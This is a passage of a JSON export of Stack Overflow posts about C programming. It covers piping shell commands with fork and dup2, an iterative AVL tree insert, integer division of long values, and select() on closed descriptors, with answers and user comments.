"https://www.gravatar.com/avatar/5e2861b08f37fa306fbf5384994af688?s=128&d=identicon&r=PG", "display_name": "Charles Duffy", "link": "https://stackoverflow.com/users/14122/charles-duffy"}, "edited": false, "score": 5, "creation_date": 1551908021, "post_id": 55032457, "comment_id": 96817542, "body": "<code>&gt;</code> is an instruction to the shell, not an argument to <code>wc</code>; it tells <i>the shell</i> to open <code>newfile.txt</code> for write and <code>dup2()</code> it over to FD 1 before the <code>exec*</code>-family call. Thus, you need to implement that logic yourself as well."}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 2, "creation_date": 1551908049, "post_id": 55032457, "comment_id": 96817553, "body": "Just like the pipe operator (<code>|</code>) is implemented by the shell, so is the output redirection operator <code>&gt;</code>.  To emulate the shell command you present, your program has to implement the latter, too."}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1551921758, "post_id": 55032457, "comment_id": 96821685, "body": "suggest learning about the function: <code>popen()</code> and its&#39; application"}], "answers": [{"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 1, "creation_date": 1552027843, "post_id": 55057934, "comment_id": 96864696, "body": "just one more small detail: if <code>fork()</code> returns a negative number, the OP could issue an error message and fail instead of producing an empty output file with no error."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 3, "creation_date": 1552029170, "post_id": 55057934, "comment_id": 96865200, "body": "These three lines are evil: <code>int fd = open(&quot;newfile.txt&quot;, O_CREAT|O_TRUNC|O_WRONLY, S_IRUSR|S_IWUSR);     dup2(fd, 1);     close(fd);</code> \u2014 you previously defined <code>fd</code> as an array of 2 <code>int</code>; now you redefine it as a single <code>int</code> (in a block where you&#39;ve already used the array variant).  That&#39;s pretty nasty.  I strongly recommend using a different name for one of the variables.  It would be courteous to report what failed to execute if either or both of the <code>execlp()</code> calls fails."}], "tags": [], "owner": {"reputation": 1404, "user_id": 7671328, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6gynE.jpg?s=128&g=1", "display_name": "Yunbin Liu", "link": "https://stackoverflow.com/users/7671328/yunbin-liu"}, "is_accepted": false, "score": 2, "last_activity_date": 1552029504, "last_edit_date": 1552029504, "creation_date": 1552027003, "answer_id": 55057934, "question_id": 55032457, "link": "https://stackoverflow.com/questions/55032457/pipe-two-shell-commands-in-c/55057934#55057934", "title": "Pipe two shell commands in C", "body": "<ol>\n<li><code>if (fork()) {</code> means <code>parent process</code> not <code>child process</code>, see <a href=\"http://man7.org/linux/man-pages/man2/fork.2.html\" rel=\"nofollow noreferrer\">http://man7.org/linux/man-pages/man2/fork.2.html</a></li>\n<li>You should handle <code>&gt;</code> like <code>|</code> use <code>open()</code></li>\n</ol>\n\n<p>The following <code>code</code> could work:</p>\n\n<pre><code>#include &lt;sys/types.h&gt;\n#include &lt;sys/stat.h&gt;\n#include &lt;fcntl.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main (void) {\n  int pipefd[2];\n  pipe(pipefd);\n\n  if (fork()) {\n    // Child process\n    dup2(pipefd[0], 0); // wc reads from the pipe\n    close(pipefd[0]);\n    close(pipefd[1]);\n    int fd = open(\"newfile.txt\", O_CREAT|O_TRUNC|O_WRONLY, S_IRUSR|S_IWUSR);\n    dup2(fd, 1);\n    close(fd);\n    execlp(\"wc\", \"wc\", \"-w\", NULL);\n  } else {\n    // Parent process\n    dup2(pipefd[1], 1); // grep writes to the pipe\n    close(pipefd[0]);\n    close(pipefd[1]);\n    execlp(\"grep\", \"grep\", \"-o\", \"colour\", \"colourfile.txt\", NULL);\n  }\n  exit(EXIT_FAILURE);\n}\n</code></pre>\n"}], "owner": {"reputation": 49, "user_id": 10941732, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e23aceebdf9f4f09114a2e41b436d514?s=128&d=identicon&r=PG&f=1", "display_name": "Zach", "link": "https://stackoverflow.com/users/10941732/zach"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 859, "favorite_count": 0, "answer_count": 1, "score": 4, "last_activity_date": 1552029504, "creation_date": 1551907826, "last_edit_date": 1552027889, "question_id": 55032457, "link": "https://stackoverflow.com/questions/55032457/pipe-two-shell-commands-in-c", "title": "Pipe two shell commands in C", "body": "<p>I'm trying to execute <code>grep -o colour colourfile.txt | wc -w &gt; newfile.txt</code> through a program in C, instead of using the command line. </p>\n\n<p>This is what I have so far:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n\nint main (void) {\n    int fd[2];\n\n    pipe(fd);\n\n    if (fork()) {\n        // Child process\n        dup2(fd[0], 0); // wc reads from the pipe\n        close(fd[0]);\n        close(fd[1]);\n        execlp(\"wc\", \"wc\", \"-w\", \"&gt;\", \"newfile.txt\", NULL);\n    } else {\n        // Parent process\n        dup2(fd[1], 1); // grep writes to the pipe\n        close(fd[0]);\n        close(fd[1]);\n        execlp(\"grep\", \"grep\", \"-o\", \"colour\", \"colourfile.txt\", NULL);\n    }\n    exit(EXIT_FAILURE);\n}\n</code></pre>\n"}, {"tags": ["c", "data-structures", "avl-tree"], "comments": [{"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 2, "creation_date": 1551907281, "post_id": 55032224, "comment_id": 96817230, "body": "Note what it says in <a href=\"https://stackoverflow.com/questions/750178/is-it-a-good-idea-to-typedef-pointers\">Is it a good idea to typedef pointers</a> \u2014 TL;DR, the answer is generally &quot;No&quot;."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1551907572, "post_id": 55032224, "comment_id": 96817332, "body": "You&#39;re not using the <code>less</code> or <code>key</code> members while inserting the data; and you don&#39;t pass pointers to initialize them to the <code>create</code> function.  Inside the <code>insert()</code> function, you are doing some funky stuff with <code>key1</code> and <code>key2</code>, completely subverting the generic code framework you have, and you call <code>less</code> and <code>key</code> directly \u2014 they aren&#39;t the function pointer members of the structure.  (This is not C++!)"}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1551907737, "post_id": 55032224, "comment_id": 96817407, "body": "You don&#39;t show <code>traverse()</code> or <code>avl_balance()</code>, so this isn&#39;t an MCVE (<a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>).  And your <code>free(tree)</code> is bound to leak a lot of allocated memory if you&#39;ve inserted any data into the tree.  You might well need a function pointer to free the data, too.  Or maybe you need an <code>apply()</code> function a bit like <code>traverse()</code>  that can be called to free the data in each node."}, {"owner": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 1, "creation_date": 1551909711, "post_id": 55032224, "comment_id": 96818271, "body": "Of the various examples, the <a href=\"https://rosettacode.org/wiki/AVL_tree/C\" rel=\"nofollow noreferrer\">Efficient AVL tree - rosettacode.com</a> has a decent iterative insert."}, {"owner": {"reputation": 1468, "user_id": 10332049, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-b85YaqT-DmE/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7rmt7ZG1JNW3HMFwSmbw7iYxcGZTw/mo/photo.jpg?sz=128", "display_name": "Saucy Goat", "link": "https://stackoverflow.com/users/10332049/saucy-goat"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551913735, "post_id": 55032224, "comment_id": 96819747, "body": "@JonathanLeffler thank you for the reply. <code>less</code> and <code>key</code> are both meant to be assigned to the structure, but for testing purposes I simply defined them in the same file and used them. As to key1 and key2: the aforementioned function <code>key</code>, its purpose is so that the user decides by which criteria he wants his data compared. That function should provide an integer by which elements can be compared."}, {"owner": {"reputation": 1468, "user_id": 10332049, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-b85YaqT-DmE/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7rmt7ZG1JNW3HMFwSmbw7iYxcGZTw/mo/photo.jpg?sz=128", "display_name": "Saucy Goat", "link": "https://stackoverflow.com/users/10332049/saucy-goat"}, "reply_to_user": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 0, "creation_date": 1551913860, "post_id": 55032224, "comment_id": 96819793, "body": "@JonathanLeffler I thought the post would be too long if I added them, but I shall edit them into the answer. Apologies for the inconvenience. As to the freed memory, I have some code that frees everything but deleted it for convenience. If/when this issue is fixed, I will add it so that someone who finds this can effortlessly keep the memory sheet clean :)"}, {"owner": {"reputation": 1468, "user_id": 10332049, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-b85YaqT-DmE/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7rmt7ZG1JNW3HMFwSmbw7iYxcGZTw/mo/photo.jpg?sz=128", "display_name": "Saucy Goat", "link": "https://stackoverflow.com/users/10332049/saucy-goat"}, "reply_to_user": {"reputation": 68403, "user_id": 3422102, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/Tg0Gt.png?s=128&g=1", "display_name": "David C. Rankin", "link": "https://stackoverflow.com/users/3422102/david-c-rankin"}, "edited": false, "score": 0, "creation_date": 1551914028, "post_id": 55032224, "comment_id": 96819850, "body": "@DavidC.Rankin thank you very much, I was baffled by the difficulty I had finding a decent AVL implementation, and the resource you provided is very useful."}, {"owner": {"reputation": 1468, "user_id": 10332049, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-b85YaqT-DmE/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7rmt7ZG1JNW3HMFwSmbw7iYxcGZTw/mo/photo.jpg?sz=128", "display_name": "Saucy Goat", "link": "https://stackoverflow.com/users/10332049/saucy-goat"}, "edited": false, "score": 0, "creation_date": 1551914563, "post_id": 55032224, "comment_id": 96820017, "body": "Please note that any functions that appear in the code after the latest edit that aren&#39;t defined in the post do work properly, as I have tested them when I made the recursive version."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 1, "creation_date": 1552182303, "post_id": 55032224, "comment_id": 96913001, "body": "Please note that we don&#39;t have copies of your working functions, so it is hard for us to know how they work.  MCVE expands to include <b>Complete</b> \u2014 which means &quot;can be run&quot;."}], "owner": {"reputation": 1468, "user_id": 10332049, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-b85YaqT-DmE/AAAAAAAAAAI/AAAAAAAAAAA/AAnnY7rmt7ZG1JNW3HMFwSmbw7iYxcGZTw/mo/photo.jpg?sz=128", "display_name": "Saucy Goat", "link": "https://stackoverflow.com/users/10332049/saucy-goat"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 898, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1551914193, "creation_date": 1551906756, "last_edit_date": 1551914193, "question_id": 55032224, "link": "https://stackoverflow.com/questions/55032224/avl-tree-in-c-with-iterative-insertion", "title": "AVL Tree in C with iterative insertion", "body": "<p>I'm coding a generic AVL tree as both a challenge to myself and, if I can do it properly, a resource for other CS students out there.</p>\n\n<p>As one usually would, I started by implementing a recursive insertion function, which works. However, due to efficiency, I tried to implement the same function, but iteratively. I searched online and found lots of implementations, but the rest of the code was always too different from mine, which led me to continue attempting to create an implementation from scratch.</p>\n\n<p>These are the relevant defined types:</p>\n\n<pre><code>typedef struct info {\n    int id;\n    char name[200];\n} data;\n\ntypedef struct avl_node {\n    void * data;\n    struct avl_node * left;\n    struct avl_node * right;\n    int height;\n} * avl_node_t;\n\ntypedef struct avl_tree {\n    avl_node_t root;\n    int num_nodes;\n    int (*less)(const void * first, const void * second);\n    int (*key)(const void * data);\n} * avl_t;\n</code></pre>\n\n<p>And as follows is the iterative insertion function (which doesn't work as intended):</p>\n\n<pre><code>avl_node_t\navl_insert(avl_node_t node, void * data)\n{\n    long key1 = 0, key2 = 0;\n    avl_node_t aux = NULL;\n\n    while (1) {\n        if (node == NULL) {\n            node = avl_node_create(data);\n            break;\n        }\n\n        key1 = key((void*)&amp;data);\n        key2 = key((void*)&amp;(node-&gt;data));\n\n        aux = node;\n\n        if (less((void*)&amp;key1, (void*)&amp;key2))\n            node = node-&gt;left;\n        else\n            node = node-&gt;right;\n    }\n\n    if (aux != NULL) {\n        if (less((void*)&amp;key1, (void*)&amp;key2))\n            aux-&gt;right = node;\n        else if (less((void*)&amp;key2, (void*)&amp;key1))\n            aux-&gt;left = node;\n    }\n\n    node = avl_balance(node);\n\n    return node;\n}\n</code></pre>\n\n<p>In which the <code>avl_balance</code> function is defined as such:</p>\n\n<pre><code>static short\nbalance(avl_node_t node)\n{\n    if (node == NULL)\n        return 0;\n\n    return avl_node_height(node-&gt;left) - avl_node_height(node-&gt;right);\n}\nstatic avl_node_t\navl_balance(avl_node_t node)\n{\n    short balance_factor;\n\n    if (node == NULL)\n        return node;\n\n    balance_factor = balance(node);\n\n    if (balance_factor &gt; 1)\n        if (balance(node-&gt;left) &gt;= 0)\n            node = avl_rotRight(node);\n        else\n            node = avl_rotLeftRight(node);\n    else if (balance_factor &lt; -1)\n        if (balance(node-&gt;right) &lt;= 0)\n            node = avl_rotLeft(node);\n        else\n            node = avl_rotRightLeft(node);\n    else\n        update_height(node);\n\n    return node;\n}\n</code></pre>\n\n<p>This is the code I'm using to test the AVL tree:</p>\n\n<pre><code>int main()\n{\n    data d1 = { 1, \"we are number one\" };\n    data d2 = { 2, \"boneless pizza\" };\n    data d3 = { 3, \"hehe\" };\n    data d4 = { 4, \"achoo\" };\n    data d5 = { 5, \"I like C\" };\n    data d6 = { 6, \"Assembly is cool too\" };\n    data d7 = { 7, \"SIGSEGV\" };\n\n    avl_t tree = avl_create();\n\n    avl_node_t root = tree-&gt;root;\n\n    root = avl_insert(root, (void*)&amp;d1);\n    traverse(root);\n    root = avl_insert(root, (void*)&amp;d2);\n    traverse(root);\n    root = avl_insert(root, (void*)&amp;d3);\n    root = avl_insert(root, (void*)&amp;d4);\n    root = avl_insert(root, (void*)&amp;d5);\n    root = avl_insert(root, (void*)&amp;d6);\n    root = avl_insert(root, (void*)&amp;d7);\n    traverse(root);\n\n    free(tree);\n\n    exit(0);\n}\n</code></pre>\n\n<p>In which <code>traverse</code> is defined as such:</p>\n\n<pre><code>void visit(void * d)\n{\n    data * my_data = (data*)d;\n    printf(\"I am element number %d named %s\\n\", (*my_data).id, (*my_data).name);\n    fflush(stdout);\n}\nvoid traverse(avl_node_t node)\n{\n    if (node == NULL)\n        return;\n\n    traverse(node-&gt;left);\n    traverse(node-&gt;right);\n    visit(node-&gt;data);\n}\n</code></pre>\n\n<p>And finally, this is the output I'm getting from this test:</p>\n\n<pre><code>I am element number 1 named we are number one\nI am element number 2 named boneless pizza\nI am element number 7 named SIGSEGV\n</code></pre>\n\n<p>Thank you in advance.</p>\n"}, {"tags": ["c", "bitstuffing"], "comments": [{"owner": {"reputation": 97942, "user_id": 25324, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c812d568dcbf02b96796728be3cac626?s=128&d=identicon&r=PG", "display_name": "pmg", "link": "https://stackoverflow.com/users/25324/pmg"}, "edited": false, "score": 3, "creation_date": 1551906521, "post_id": 55032113, "comment_id": 96816902, "body": "Use <code>long c;</code> (or, C99, <code>long long c;</code>) for a larger limit. To scan a <code>long</code> use <code>&quot;%ld&quot;</code> (<code>&quot;%lld&quot;</code> for long long). To print a <code>long</code> use <code>&quot;%ld&quot;</code> (<code>&quot;%lld&quot;</code> for long long)"}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 3, "creation_date": 1551906583, "post_id": 55032113, "comment_id": 96816935, "body": "As long as you use <code>long</code> for all your intermediate results you should be fine."}, {"owner": {"reputation": 78982, "user_id": 1848654, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/84180c0f3c9c04f8b8f0613fc0129dac?s=128&d=identicon&r=PG", "display_name": "melpomene", "link": "https://stackoverflow.com/users/1848654/melpomene"}, "edited": false, "score": 2, "creation_date": 1551906925, "post_id": 55032113, "comment_id": 96817079, "body": "&quot;<i>...  because the &quot;n/10&quot; is no longer an integer</i>&quot; - why would <code>n&#47;10</code> no longer be an integer?"}, {"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1551906963, "post_id": 55032113, "comment_id": 96817094, "body": "Integer division works just fine for all integer types, including <code>long int</code> in particular.  Ditto the modulus operator.  Your problem is likely that you are not <i>inputting</i> your value into a <code>long int</code> correctly (but we don&#39;t know, because you&#39;ve not presented a version of your code that attempts to do so)."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "edited": false, "score": 3, "creation_date": 1551907136, "post_id": 55032113, "comment_id": 96817168, "body": "Since you have <code>scanf(&quot;%d&quot;,&amp;n);</code> and <code>n</code> is an <code>int</code>, you can&#39;t get a value outside the range of <code>int</code> into <code>n</code>, so the question is moot on that point.  It isn&#39;t even interesting to ask what happens if you type a value for <code>n</code> that is too big \u2014 that is simply undefined behaviour (in the <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/scanf.html\" rel=\"nofollow noreferrer\"><code>scanf()</code></a> function)."}, {"owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "edited": false, "score": 1, "creation_date": 1551907405, "post_id": 55032113, "comment_id": 96817275, "body": "You should really be reading the user input as a string instead of an integer.  Then you won&#39;t be limited to the range of any integer type and you can enter bit patterns that start with one ore more zeros."}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1551917200, "post_id": 55032113, "comment_id": 96820681, "body": "Post sample input and example outputs to add clarity."}], "owner": {"reputation": 5, "user_id": 9505294, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/af0a5632bb3ad61219860552ab420d15?s=128&d=identicon&r=PG&f=1", "display_name": "Dexter", "link": "https://stackoverflow.com/users/9505294/dexter"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 798, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1551906873, "creation_date": 1551906307, "last_edit_date": 1551906485, "question_id": 55032113, "link": "https://stackoverflow.com/questions/55032113/how-to-do-a-integer-division-of-a-long-int-in-c", "title": "How to do a integer division of a long int in c?", "body": "<p>So i  am writing  a  code for Bit Stuffing in C.  What I am trying to do is take an  input from user,keep on dividing  the number to get each digit using \"%\" operator.This works as long  as the no is in the range of  int. If I use long int type,the  code  no  longer  works  mostly  because the \"n/10\" is no longer an integer.So how do I do an integer division of the long int type variable.In python \"//\" used to work for this purpose.Anything similar in C? \nAnd I don't want to use an array  because in that case the user has to input one digit at  a  time.Here's my code for reference.Thanks</p>\n\n<pre><code>#include &lt;stdio.h&gt;\nint main(){\n    int c,n,m,bit[200]={0,1,1,1,1,1,1,0},x=7,count=0,ch=0;\n\n    do{\n        printf(\"Enter No:\\n\");\n        scanf(\"%d\",&amp;n);\n        m=n;\n        while(m&gt;0){\n            c=m%10;\n            m=m/10;\n            if(c==1){\n                count++;\n            }\n            else if(c==0){\n                count=0;\n            }\n            else if(c&gt;1 &amp;&amp; c&lt;10){\n                printf(\"Invalid  Pattern.Enter Either 1 or 0.\\n\");\n                ch=1;\n                break;\n            }\n            ch=0;\n            x++;\n            bit[x]=c;\n            if(count==5){x++;bit[x]=0;count=0;}\n        }\n\n    }while(ch==1);\n\n    x++;\n    bit[x]=0;\n    for(int i=0;i&lt;=5;i++){\n        x++;\n        bit[x]=1;\n    }\n    x++;\n    bit[x]=0;\n    for(int i=0;i&lt;=x;i++){\n        printf(\"%d\",bit[i]);\n    }\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "select"], "comments": [{"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 4, "creation_date": 1551904704, "post_id": 55031563, "comment_id": 96816143, "body": "After it&#39;s closed it is no longer a file descriptor."}, {"owner": {"user_type": "does_not_exist", "display_name": "user6214276"}, "reply_to_user": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1551905878, "post_id": 55031563, "comment_id": 96816619, "body": "it&#39;s a socket, what if it is closed by the client but not by the server. Shouldn&#39;t the select receive an EOF? @stark"}], "answers": [{"comments": [{"owner": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 0, "creation_date": 1551908118, "post_id": 55031967, "comment_id": 96817577, "body": "After it has been closed, a file descriptor may be reused."}, {"owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "reply_to_user": {"reputation": 10359, "user_id": 1216776, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/504692de390dabd9ca22fd716e178993?s=128&d=identicon&r=PG", "display_name": "stark", "link": "https://stackoverflow.com/users/1216776/stark"}, "edited": false, "score": 1, "creation_date": 1551911701, "post_id": 55031967, "comment_id": 96818959, "body": "Of course, but then it is no longer a closed file descriptor; it\u2019s just not the one you intended to select on."}], "tags": [], "owner": {"reputation": 663663, "user_id": 15168, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/WtEI9.png?s=128&g=1", "display_name": "Jonathan Leffler", "link": "https://stackoverflow.com/users/15168/jonathan-leffler"}, "is_accepted": false, "score": 1, "last_activity_date": 1551905664, "last_edit_date": 1592644375, "creation_date": 1551905664, "answer_id": 55031967, "question_id": 55031563, "link": "https://stackoverflow.com/questions/55031563/will-a-descriptor-that-has-been-closed-before-being-put-in-a-fd-set-be-selected/55031967#55031967", "title": "Will a descriptor that has been closed before being put in a fd_set be selected?", "body": "<p>POSIX <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/select.html\" rel=\"nofollow noreferrer\"><code>select()</code></a>\nrequires a closed file descriptor to generate an error:</p>\n<blockquote>\n<h3>ERRORS</h3>\n<p>Under the following conditions, <code>pselect()</code> and <code>select()</code> shall fail and set <code>errno</code> to:</p>\n<p>[EBADF]<br />\nOne or more of the file descriptor sets specified a file descriptor that is not a valid open file descriptor.</p>\n</blockquote>\n"}, {"tags": [], "owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "is_accepted": true, "score": 1, "last_activity_date": 1551905677, "creation_date": 1551905677, "answer_id": 55031975, "question_id": 55031563, "link": "https://stackoverflow.com/questions/55031563/will-a-descriptor-that-has-been-closed-before-being-put-in-a-fd-set-be-selected/55031975#55031975", "title": "Will a descriptor that has been closed before being put in a fd_set be selected?", "body": "<blockquote>\n  <p>If while I put a connection descriptor in the rdset used in the select\n  syscall the client closes that descriptor so it is already closed when\n  the select is called, will it still be selected and a read/write on it\n  return 0?</p>\n  \n  <p>Or will it remain in the set and never be selected?</p>\n</blockquote>\n\n<p>Possibly neither.  The most likely result is that the <code>select()</code> call fails, returning <code>-1</code> and setting <code>errno</code> to <code>EBADF</code>.  <a href=\"http://pubs.opengroup.org/onlinepubs/9699919799/functions/select.html\" rel=\"nofollow noreferrer\">Per POSIX</a>, this indicates that</p>\n\n<blockquote>\n  <p>One or more of the file descriptor sets specified a file descriptor that is not a valid open file descriptor.</p>\n</blockquote>\n\n<p><a href=\"http://man7.org/linux/man-pages/man2/select.2.html\" rel=\"nofollow noreferrer\">The Linux manual page for select(2)</a> gives a file descriptor that was already closed as a specific example of a bad file descriptor.  <em>However</em>, the Linux manual also documents a bug that Linux <code>select()</code> ignores FDs in the provided fdsets that are greater than any that the process currently has open.  On Linux, then, you cannot rely on <code>select()</code> failing in your scenario, but if <code>select()</code> does not fail then it will never select the file descriptor in question.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user6214276"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 36, "favorite_count": 0, "accepted_answer_id": 55031975, "answer_count": 2, "score": 1, "last_activity_date": 1551905677, "creation_date": 1551903672, "question_id": 55031563, "link": "https://stackoverflow.com/questions/55031563/will-a-descriptor-that-has-been-closed-before-being-put-in-a-fd-set-be-selected", "title": "Will a descriptor that has been closed before being put in a fd_set be selected?", "body": "<p>If while I put a connection descriptor in the rdset used in the <code>select</code> syscall the client closes that descriptor so it is already closed when the select is called, will it still be selected and a read/write on it return 0?</p>\n\n<p>Or will it remain in the set and never be selected?</p>\n"}, {"tags": ["c", "pointers"], "comments": [{"owner": {"reputation": 21147, "user_id": 7733418, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/b08876b87c096cd006f66820ffc67f27?s=128&d=identicon&r=PG", "display_name": "Yunnosch", "link": "https://stackoverflow.com/users/7733418/yunnosch"}, "edited": false, "score": 0, "creation_date": 1551903890, "post_id": 55031546, "comment_id": 96815803, "body": "Please try to avoid the impression that you want an exam question answered."}, {"owner": {"reputation": 1142, "user_id": 8411228, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/827222d28c74281de10de373b3f48293?s=128&d=identicon&r=PG&f=1", "display_name": "Uli Sotschok", "link": "https://stackoverflow.com/users/8411228/uli-sotschok"}, "edited": false, "score": 0, "creation_date": 1551903989, "post_id": 55031546, "comment_id": 96815842, "body": "&#39;()&#39; have the highest priority, then &#39;++&#39; and then &#39;*&#39; <a href=\"https://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\">en.cppreference.com/w/c/language/operator_precedence</a>"}, {"owner": {"reputation": 29, "user_id": 9500206, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Enrique", "link": "https://stackoverflow.com/users/9500206/enrique"}, "edited": false, "score": 0, "creation_date": 